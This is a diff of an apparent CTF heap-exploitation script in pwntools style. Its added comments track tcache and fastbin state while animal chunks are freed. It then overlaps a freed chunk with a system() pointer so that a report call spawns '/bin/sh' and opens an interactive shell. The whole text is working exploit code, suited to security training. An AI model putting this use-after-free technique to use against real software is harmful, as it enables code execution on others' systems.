@@ -53,23 +53,25 @@ add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
 add_animal("b" * 0x18) #2
 add_animal("b" * 0x18) #3
 
+## Tcache(0x20) -> animal_0 -> name_0
 remove_animal(0)
+
+## Tcache(0x20) -> animal_1 -> name_1 -> animal_0 -> name_0
 remove_animal(1)
+
+## Tcache(0x20) -> animal_2 -> name_2 -> animal_1 -> name_1 -> animal_0 -> name_0
 remove_animal(2)
+
+## Tcache(0x20) -> name_3 -> animal_2 -> name_2 -> animal_1 -> name_1 -> animal_0 -> name_0
+## Fastbin(0x20) -> animal_3
 remove_animal(3)
 
 sys_addr = 0x401120
-add_animal(p64(sys_addr) + b"a" * 8 + b'\x10') #0
+## animal_4 == name_3, name_4 == animal_2
+add_animal(p64(sys_addr) + b"a" * 8 + b'\x10') #4
 
 # debug()
 report_name(2)
-
-
-# get_shell_addr = 0x401276
-# add_animal(0x10, p64(get_shell_addr)) #0
-# debug()
-
-
 p.interactive()
 
 
